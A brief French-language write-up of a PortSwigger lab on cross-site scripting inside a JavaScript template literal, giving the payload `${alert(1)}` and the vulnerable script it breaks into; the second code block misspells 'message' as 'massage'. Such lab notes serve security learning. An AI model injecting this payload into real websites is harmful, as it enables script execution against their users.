# Lab 

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped

## Payload

`${alert(1)}`

## Description

Script contenu dans le lab :

```js
var message = `0 search results for 'INPUT'`;
document.getElementById('searchMessage').innerText = message;
```

Le payload est donc interprété comme :

```js
var message = `0 search results for '${alert(1)}'`;
document.getElementById('searchMessage').innerText = massage;
```